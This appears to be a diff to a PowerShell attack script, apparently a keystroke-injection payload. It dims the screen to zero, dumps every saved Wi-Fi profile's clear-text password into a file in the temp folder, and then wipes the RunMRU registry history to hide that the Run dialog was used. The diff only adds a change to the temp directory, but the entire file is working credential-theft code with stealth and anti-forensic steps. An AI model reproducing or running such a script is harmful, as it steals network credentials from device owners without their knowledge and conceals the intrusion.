@@ -1,5 +1,9 @@
 (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0); 
 
+
+cd $env:TEMP;
+
+
 (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
     $name=$_.Matches.Groups[1].Value.Trim(); $_
 } | ForEach-Object {
@@ -9,5 +13,6 @@
 } | ForEach-Object {
     [PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }
 } | Format-Table -AutoSize | Out-File wifi_passwords.txt;
+
 
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
